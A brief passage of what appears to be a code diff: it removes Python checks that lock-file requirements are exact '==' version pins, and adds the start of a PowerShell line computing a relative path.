-    if len(specifiers) != 1 or specifiers[0].operator != "==" or specifiers[0].version.endswith(".*"):
-        raise ValueError(f"lock requirement is not an exact == pin: {line!r}")
-    version = specifiers[0].version.strip()
-    if not version or any(ch.isspace() for ch in version) or ";" in version:
-        raise ValueError(f"lock requirement has an invalid pinned version: {line!r}")
-    marker = str(requi
+            $relative = ([Uri]::new(($root.TrimEnd('\') + '
